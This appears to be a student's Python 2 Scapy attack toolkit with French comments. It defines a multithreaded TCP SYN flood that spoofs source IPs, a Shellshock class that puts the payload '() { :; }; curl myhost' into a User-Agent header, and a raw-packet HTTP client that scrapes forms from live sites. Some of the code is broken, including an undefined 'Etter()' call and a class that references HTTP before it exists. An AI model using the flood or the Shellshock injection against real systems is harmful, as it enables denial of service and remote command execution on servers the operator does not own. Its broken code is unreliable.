#! /usr/bin/env python
# -*- coding: utf-8 -*-


## TODO:
##  - remplacer les sprintf de TCP.flags par des entiers
##  - tester port range sur le syn flood


from scapy.all import *
import threading
import argparse
import random
import Queue
import time
import sys
import os
import re

class DOS():
    target = None
    port = None

    def __init__(self, target, port = 80):
        self.target = target
        self.port = int(port)

    def tcp_syn_flood(self, start=30000, length=30000, fake_ip = True):
        pool = self.createFloodPool(start, length, 100, self.__tcp_syn_flood, fake_ip, arguments = {})

        for t in pool: t.start()      # Starting threads
        for t in pool: t.join()       # Joining threads

    def createFloodPool(self, flood_port_start, flood_port_len, flood_port_step, funct, fake_ip, arguments = {}):
        pool = []
        for port in range(flood_port_start, flood_port_start + flood_port_len, flood_port_step):
            arguments['start'] = port
            arguments['end'] = port + flood_port_step
            if fake_ip: arguments['fake_ip'] = "10." + '.'.join([str(i) for i in random.sample(xrange(255), 3)])

            pool.append(threading.Thread(target=funct, name="flood-" + str(port), kwargs=arguments))

        return pool

    def __tcp_syn_flood(self, fake_ip = None, start=40000, end=50000):
        if fake_ip: ip = IP(dst=self.target, src=fake_ip)
        else: ip = IP(dst=self.target)

        syn = Etter() / ip / TCP(dport=self.port, sport=(start, end), flags='S')
        sendp(syn, verbose=0)
        # for port in range(start, end):
        #     if fa syn = ip / TCP(dport=self.port, sport=port, flags='S')
        #     else: syn = ip / TCP(dport=self.port, sport=port, flags='S')
        #     send(syn, verbose=0)
        print "Sent ", len, " with IP " + fake_ip if fake_ip else 'with local IP'

# class Attack():

class ShellShock(HTTP):#Attack):
    HTTP_HEADER = {"User-Agent":"() { :; }; curl myhost"}

    def __init__(self, host, script_page):
        self.host = HTTP(host, header=HTTP_HEADER)
        self.target = script_page

    def run(self):
        self.host.GET(target)



class HTTP():
    RES_REGEX = re.compile(r"src\=(?:\"|')(?P<location>.*?)\.(?P<ext>\w+?)(?P<param>\?.*?)?(?:\"|')", re.IGNORECASE)
    FORM_REGEX = re.compile(r"<form(?P<form_param>.*?)>(?P<content>.*?)</form>", re.IGNORECASE | re.DOTALL)
    INPUT_REGEX = re.compile(r"<input(.*?)>", re.IGNORECASE | re.DOTALL)
    PARAM_REGEX = re.compile(r"(?P<name>\w*?)\=(?:\"|')(?P<value>.*?)(?:\"|')", re.IGNORECASE)

    def __init__(self, host, sport = None, header = {}):
        self.host = host
        if not sport: self.sport = random.randint(30000, 65000)
        else: self.sport = sport

        self.request_header = {"User-Agent":"sr2i203/0.1.1+debian-1",
        "Accept":"text/html, text/*;q=0.5, image/*, application/*, video/*, audio/*, message/*, inode/*, x-content/*, misc/*, x-scheme-handler/*",
        "Host":host}

        # On ajoute les headers donnéss en paramètre
        for k in header: self.request_header[k] = header[k]

        self.get = {}

    def handshake(self):
        print "SYN/ACK ", self.host, self.sport
        syn = IP(dst = self.host) / TCP(dport=80, sport=self.sport, flags='S')
        syn_ack = sr1(syn, verbose=0)
        ack = IP(dst = self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A')
        send(ack, verbose = 0)
        return syn_ack

    def close(self, con, init = False):
        if con.haslayer(Raw):
            close = IP(dst=con[IP].src) / TCP(dport=80, sport=con[TCP].dport, seq=con[TCP].ack, ack=con[TCP].seq + len(con[Raw].load), flags='FA')
        else:
            close = IP(dst=con[IP].src) / TCP(dport=80, sport=con[TCP].dport, seq=con[TCP].ack, ack=con[TCP].seq + 1, flags='FA')

        # If connection closing initiated by client: FIN ACK / ACK / FIN ACK / ACK else FIN ACK
        if init:
            a, u = sr(close, verbose = 0, multi=1, timeout=0.5)
            r = a[-1][1]
            send(IP(dst=r[IP].src) / TCP(dport=80, sport=r[TCP].dport, seq=r[TCP].ack, ack=r[TCP].seq + 1, flags='A'), verbose=0)
        else: send(close, verbose=0)

    def addFragment(self, html_rep, page, ack, seq):

        if page in self.get and not html_rep.startswith('HTTP'):
            if not (ack, seq) in self.get[page]['data_frag']:
                self.get[page]['data_frag'][(ack, seq)] = html_rep
                self.get[page]['len'] += len(html_rep)
        elif html_rep.startswith('HTTP'):
            try: header, data = html_rep.split('\r\n\r\n', 1)
            except:
                header = html_rep
                data = ''
            header = header.split('\r\n')
            code = int(header[0].split(' ')[1])
            for i in range(len(header)):
                 if ': ' not in header[i]: header[i] += ': '
            header = {i.split(': ')[0]:i.split(': ')[1] for i in header[1:]}
            self.get[page] = {'code':code, 'header':header, 'data_frag':{(ack, seq):data}, 'data':data, 'len': len(data)}
        else:
            print "ERREUR A TRAITER: HEADER N EST PAS ARRIVE EN PREMIER..."

    def mergeFragments(self, page):
        if page in self.get:
            self.get[page]['data'] = ''.join([self.get[page]['data_frag'][i] for i in sorted(self.get[page]['data_frag'].keys())])


    def GET(self, page = '', con=None):
        # print "Going to... " + target
        # target = target.replace('http://', '')
        # try : host, page = target.split('/', 1)
        # except :
        #     host = target
        #     page = ''
        # if len(target) == 1 : target.append('')

        # Handshake
        if con == None: syn_ack = self.handshake()
        else : syn_ack = con

        # GET
        con = self.__http_get(page, syn_ack)
        del(self.get[page]['data_frag'])

        if con.sprintf('%TCP.flags%') == 'R': return None
        # FIN / ACK
        if self.get[page]['code'] == 301:
            return self.GET(self.get[page]['header']['Location'], con)
        self.close(con, True)

        return self.get[page]

    def getForms(self, page):
        forms = HTTP.FORM_REGEX.findall(self.get[page]['data'])
        self.get[page]['forms'] = []
        for params, content in forms:
            form = {}

            form = dict(HTTP.PARAM_REGEX.findall(params))

            inputs = HTTP.INPUT_REGEX.findall(content)
            form['inputs'] = {}
            for e in inputs:
                params = dict(HTTP.PARAM_REGEX.findall(e))
                try: form['inputs'][params['name']] = params
                except: form['inputs'][params['type']] = params

            self.get[page]['forms'].append(form)
        return self.get[page]['forms']

    def getRessources(self, page):
        res = HTTP.RES_REGEX.findall(self.get[page]['data'])
        to_fetch = []
        for loc,ext,param in res:
            if ext in ['html', 'htm', 'php']:
                if loc.startswith('../'):
                    # Fetch res with relative path
                    loc = os.path.normpath(os.path.join(page, loc))
                    to_fetch.append(loc)
                elif loc.startswith('/'):
                    # Fetch res with absolute path
                    to_fetch.append(loc)
                else: continue  # External res not fetched
        return to_fetch


    def formatHeader(self):
        return ''.join([i + ": " + self.request_header[i] + '\r\n' for i in self.request_header]) + '\r\n'

    def __http_get(self, page, syn_ack):
        q = Queue.Queue()

        getStr = 'GET /' + page + ' HTTP/1.1\r\n' + self.formatHeader()
        request = IP(dst=self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA') / getStr
        repl, u = sr(request, multi=1, timeout=1, verbose=0)

        for s, reply in repl: q.put(reply)

        while not q.empty():
            reply = q.get()
            if reply.sprintf('%TCP.flags%') in ['PA', 'A'] and (reply.haslayer(Raw)):
                self.addFragment(reply[Raw].load, page, reply[TCP].ack, reply[TCP].seq)

                request = IP(dst=self.host) / TCP(dport=80, sport=reply[TCP].dport, seq=reply[TCP].ack, ack=reply[TCP].seq + len(reply[Raw].load), flags='A')

                if self.get[page]['code'] != 200: return reply
                if 'Content-Length' in self.get[page]['header'] and self.get[page]['header']['Content-Length'] <= self.get[page]['len']: break
                a, u = sr(request, verbose = 0, timeout=0.1, multi=1)
                for s, r in a: q.put(r)
                # else: send(request, verbose=0)

            elif reply.sprintf('%TCP.flags%') == 'R':
                if not 'data_frag' in self.get[page]: self.get[page]['data_frag'] = ''
                break

        # for i in self.get[page]['data_frag']:
        #     print i, ' : ', self.get[page]['data_frag'][i][-50:]
        # print len(self.get[page]['data']), self.get[page]['header']['Content-Length']
        self.mergeFragments(page)
        return reply

if __name__ == "__main__":
    conf.L3socket=L3RawSocket

    # parser = argparse.ArgumentParser(
    #     formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    #     description="Print HTTP Request headers (must be run as root or with capabilities to sniff).",
    # )
    # parser.add_argument("--interface", "-i", help="Which interface to sniff on.", default="eth0")
    # parser.add_argument("--filter", "-f", help='BPF formatted packet filter.', default="tcp and port 80")
    # parser.add_argument("--count", "-c", help="Number of packets to capture. 0 is unlimited.", type=int, default=0)
    # args = parser.parse_args()

    # Usage: args.count, args.filter, ...

    target = 'http://google.fr'
    # target = 'http://10.0.2.2/index.nginx-debian.html'
    # target = 'http://192.168.0.14/'

    site = HTTP("192.168.0.32")
    # site = HTTP("eleve.scrjpl.fr")
    site = HTTP("korben.info")

    # html_rep = site.GET('groups/new.php')
    # html_rep = site.GET('index.nginx-debian.html')
    html_rep = site.GET('')
    print site.getForms('')


    if html_rep == None:
        print "Connection was reseted for an unkown reason."
        sys.exit(0)

    code = html_rep['code']

    if code == 404:
        print code, " - Not found"
    elif code == 301:
        print "Moved at : " + html_rep['header']['Location']
        close(reply)
    elif code == 200:
        # print HTTP.RES_REGEX.findall(html_rep['data'])
        # print html_rep['data']
        print code

    # f = DOS("192.168.0.17", 80)
    # f.tcp_syn_flood()
